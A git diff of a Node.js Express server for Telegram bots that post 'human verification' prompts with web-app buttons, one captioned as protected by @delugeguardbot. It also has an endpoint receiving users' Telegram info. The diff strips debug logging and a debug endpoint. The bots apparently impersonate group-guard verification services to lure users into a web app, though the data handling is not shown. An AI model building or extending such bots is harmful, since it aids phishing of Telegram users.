@@ -60,10 +60,9 @@ guardianBot.getMe().then(botInfo => {
 
 const app = express();
 app.use(express.json());
-app.use(express.static("public"));
+app.use(express.static("public"))
 
 app.post("/api/users/telegram/info", async (req, res) => {
-  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
   try {
     const {
       userId,
@@ -107,12 +106,6 @@ app.post("/api/users/telegram/info", async (req, res) => {
     console.error("500 server error", error);
     res.status(500).json({ error: "server error" });
   }
-});
-
-// Add a debug endpoint to capture logs from client-side scripts
-app.post('/api/debug', (req, res) => {
-  console.log(`Debug message: ${req.body.message}`);
-  res.json({ status: 'ok' });
 });
 
 const handleRequest = async (req, res, data) => {  
@@ -165,7 +158,7 @@ const handleRequest = async (req, res, data) => {
           ],
         ]
       }
-    };
+    }
 
     const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
 
@@ -177,7 +170,7 @@ const handleRequest = async (req, res, data) => {
   }
 
   res.json({});
-};
+}
 
 const handleNewChatMember = async (bot, type) => {
   bot.on("my_chat_member", (update) => {
@@ -212,11 +205,10 @@ const handleNewChatMember = async (bot, type) => {
       bot.sendPhoto(chatId, imageToSend, jsonToSend);
     }
   });
-};
+}
 
 function handleStart(bot) {
-  bot.onText(/\/start(?: (.*))?$/, (msg, match) => {
-    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
+  bot.onText(/\/start (.*)$/, (msg, match) => {
     let botInfo;
     bot.getMe().then(botInformation => {
       botInfo = botInformation;
@@ -236,9 +228,8 @@ function handleStart(bot) {
                 }
               }]]
             }
-          };
-          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
-          imageToSend = safeguardVerification;
+          }
+          imageToSend = safeguardVerification
         } else if (botInfo.username === delugeUsername) {
           jsonToSend = {
             caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
@@ -251,9 +242,8 @@ function handleStart(bot) {
                 }
               }]]
             }
-          };
-          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
-          imageToSend = delugeVerification;
+          }
+          imageToSend = delugeVerification
         } else if (botInfo.username === guardianUsername) {
           jsonToSend = {
             caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
@@ -266,9 +256,8 @@ function handleStart(bot) {
                 }
               }]]
             }
-          };
-          console.log(`Sending web_app button for ${botInfo.username} with URL: ${jsonToSend.reply_markup.inline_keyboard[0][0].web_app.url}`);
-          imageToSend = guardianVerification;
+          }
+          imageToSend = guardianVerification
         }
         
         bot.sendPhoto(
@@ -278,7 +267,9 @@ function handleStart(bot) {
         );
       }
     });
+  
   });
+
 }
 
 handleNewChatMember(safeguardBot, "safeguard");
